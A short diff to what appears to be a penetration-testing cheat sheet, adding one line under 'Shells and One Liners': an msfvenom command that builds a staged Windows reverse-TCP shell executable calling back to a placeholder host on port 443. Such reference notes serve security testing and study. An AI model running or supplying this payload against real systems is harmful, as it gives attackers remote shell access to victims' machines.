@@ -64,7 +64,7 @@ Also use LinPEAS or LinENUM
 ## Persistence
 
 ## Shells and One Liners
-
+`msfvenom -p windows/x64/shell/reverse_tcp LHOST=IP.Addr.es.ss LPORT=443 -f exe -o staged_reverse_tcp.exe`
 
 ## Resources and Links
 |Description|Link|
